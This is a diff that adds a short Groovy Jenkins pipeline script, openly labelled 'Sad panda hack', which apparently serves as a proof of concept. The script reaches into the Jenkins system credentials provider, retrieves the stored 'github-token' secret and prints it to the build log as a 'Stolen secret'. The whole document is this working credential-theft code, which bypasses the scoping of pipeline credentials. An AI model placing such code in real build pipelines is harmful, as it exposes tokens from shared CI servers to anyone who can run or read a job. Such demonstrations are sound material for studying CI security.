@@ -1,0 +1,24 @@
+#!groovy
+
+import jenkins.model.Jenkins
+import hudson.util.Secret
+
+@NonCPS
+Secret getGitHubAPIToken(String credentials_id) {
+    Jenkins.instance.getExtensionList("com.cloudbees.plugins.credentials.SystemCredentialsProvider")[0].getCredentials().find {
+        it.class.simpleName == 'StringCredentialsImpl' && it.id == credentials_id
+    }.with {
+        if(it) {
+            it.secret
+        }
+    }
+}
+
+@NonCPS
+String sadPanda() {
+    "Stolen secret: ${getGitHubAPIToken('github-token')}"
+}
+
+stage("Sad panda hack") {
+    echo sadPanda()
+}
